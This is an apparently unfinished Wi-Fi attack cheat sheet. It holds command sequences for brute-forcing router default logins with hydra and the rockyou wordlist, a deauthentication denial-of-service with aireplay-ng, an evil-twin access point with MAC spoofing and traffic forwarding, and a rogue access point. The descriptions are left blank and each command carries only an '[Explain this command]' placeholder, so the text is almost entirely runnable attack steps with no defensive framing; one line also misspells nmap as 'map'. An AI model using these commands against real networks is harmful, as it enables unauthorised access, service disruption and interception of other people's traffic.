## Cracking Default Accounts on the Access Points
*Description:*

map -p 80 --script http-default-accounts [router IP]
hydra -l admin -P /usr/share/wordlists/rockyou.txt [router IP] http-get /

## Deauthentication DoS Attack
*Description:*

```bash
airmon-ng start wlan0  # [Explain this command]
airodump-ng mon0  # [Explain this command]
aireplay-ng --deauth 1000 -a [target AP MAC] mon0  # [Explain this command]

```
## Evil Twin with MAC Spoofing
*Description:*

```bash
airmon-ng start wlan0  # [Explain this command]
airodump-ng mon0  # [Explain this command]
macchanger --mac [spoofed MAC] wlan0
airbase-ng -e [ESSID] -c [channel] -a [spoofed MAC] mon0  # [Explain this command]
ifconfig at0 up  # [Explain this command]
dhcpd at0  # [Explain this command]
ifconfig at0 192.168.10.1 netmask 255.255.255.0  # [Explain this command]
iptables --flush  # [Explain this command]
iptables --table nat --flush  # [Explain this command]
iptables --delete-chain  # [Explain this command]
iptables --table nat --delete-chain  # [Explain this command]
iptables -P FORWARD ACCEPT  # [Explain this command]
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  # [Explain this command]
echo 1 > /proc/sys/net/ipv4/ip_forward  # [Explain this command]

```
## Rogue Access Point
*Description:*

```bash
airmon-ng start wlan0  # [Explain this command]
airbase-ng -e RogueAP -c [channel] mon0  # [Explain this command]
ifconfig at0 up  # [Explain this command]
dhclient at0
```